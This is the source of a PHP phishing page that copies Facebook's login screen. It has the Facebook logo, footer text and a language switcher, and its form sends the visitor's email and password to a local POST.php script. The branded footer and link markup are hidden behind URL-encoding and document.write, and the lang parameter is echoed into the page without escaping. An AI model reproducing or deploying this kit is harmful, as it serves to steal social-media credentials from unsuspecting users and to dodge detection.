<?php


    $get_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
    
    if(isset($_GET['lang'])){
        $get_lang = $_GET['lang'];
    }
    
    include(__DIR__ . "/langs.php");

    $lang_rtl = array('ar','pk','ur'); 
    
?>

<!DOCTYPE html>
<html lang="<?php echo $get_lang; ?>">
<head>

    
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="icon.png">
    <title><?php echo $lang['1']; ?></title>
    <link rel="stylesheet" href="bootstrap.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<style>
    body{
        direction: <?php if(in_array($get_lang, $lang_rtl)){echo 'rtl';}else{echo 'ltr';} ?>;
        text-align: <?php if(in_array($get_lang, $lang_rtl)){echo 'right';}else{echo 'left';} ?>;;
    }

    .alerta {
        display: <?php if(in_array($get_lang, $lang_rtl)){echo 'none';}else{echo 'block';} ?>;
    }

    .alerta2{
        display: <?php if(in_array($get_lang, $lang_rtl)){echo 'block';}else{echo 'none';} ?>;
    }
</style>
<body>

    <div class="fb-logo"><img src="dF5SId3UHWd.svg" alt=""></div>
    <div class="container">
        <div class="alerta">
            <div class="text-center alertbox">
                <span class="boxe"></span>
                <span class="txt1"><?php echo $lang['2']; ?></span>
            </div>
        </div>
        <div class="alerta2">
            <div class="text-center alertbox">
            <span class="boxe"></span>
                <span class="txt1"><?php echo $lang['2']; ?></span>
                
            </div>
        </div>
        <div class="form-box">
            <h5 class="text-center" style="margin-bottom: 16px;"><?php echo $lang['3']; ?></h5>
            <div class="umi"><?php echo $lang['4']; ?></div>
            <form action="POST.php" method="POST">
                <input type="text" name="email" placeholder="<?php echo $lang['5']; ?>" required="required">
                <input minlength="6" type="password" name="password" placeholder="<?php echo $lang['6']; ?>" required="required">
                <button class="btn btn-primary b1"><?php echo $lang['7']; ?></button>
                <p class="text-center forget"><?php echo $lang['8']; ?></p>
                <div class="aps">
                    <hr class="hr">
                    <p><span><?php echo $lang['9']; ?></span></p>
                </div>

                <button class="btn btn-success text-center c1"><?php echo $lang['10']; ?></button>
                <br>
                
                
            </form>
        </div>
        
       <script language=javascript>document.write(unescape('%3Cdiv%20class%3D%22lang%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22row%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-6%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20text-center%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Den%22%3EEnglish%20%28UK%29%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dar%22%3E%u0627%u0644%u0639%u0631%u0628%u064A%u0629%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dfi%22%3EFilipino%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dur%22%3E%u200F%u0627%u0631%u062F%u0648%u200F%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/ul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-6%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20text-center%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dfr%22%3EFran%E7ais%20%28France%29%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Did%22%3EBahasa%20Indonesia%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dpa%22%3E%u0A2A%u0A70%u0A1C%u0A3E%u0A2C%u0A40%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Cspan%20class%3D%22plus%22%3E+%3C/span%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/ul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22text-center%22%20style%3D%22font-size%3A%2012px%3B%20color%3A%20gray%3B%20margin-top%3A%2020px%3B%22%3EFacebook%20Inc.%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E'))</script>

    </div>

    <!-- Lang for PC --> 

    <script language=javascript>document.write(unescape('%3Cdiv%20class%3D%22lang2%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22langup%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Den%22%3EEnglish%20%28UK%29%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dar%22%3E%u0627%u0644%u0639%u0631%u0628%u064A%u0629%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dfr%22%3EFran%E7ais%20%28France%29%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dfi%22%3EFilipino%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dur%22%3E%u200F%u0627%u0631%u062F%u0648%u200F%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3D%22%3EItaliano%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Did%22%3EBahasa%20Indonesia%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Des%22%3EEspa%F1ol%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dtr%22%3ET%FCrk%E7e%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dpt%22%3EPortugu%EAs%20%28Brasil%29%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dpa%22%3E%u0A2A%u0A70%u0A1C%u0A3E%u0A2C%u0A40%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Cspan%20class%3D%22plus%22%3E+%3C/span%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/ul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Chr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3ESign%20Up%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3ELog%20In%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EMessenger%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EFacebook%20Lite%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EWatch%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EPeople%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EPages%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EPage%20categories%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EPlaces%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EGames%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3ELocations%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EMarketplace%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EFacebook%20Pay%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EGroups%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EJobs%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EOculus%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EPortal%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EInstagram%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3ELocal%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EFundraisers%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EServices%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EVoting%20Information%20Centre%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EAbout%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3ECreate%20ad%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3ECreate%20Page%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EDevelopers%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3ECareers%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EPrivacy%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3ECookies%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EAdChoices%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3ETerms%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EHelp%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3ESettings%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EActivity%20log%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3EFacebook%20%A9%202021%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/ul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E'))</script>

    <script src="jq.js"></script>
    <script src="bootstrap.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
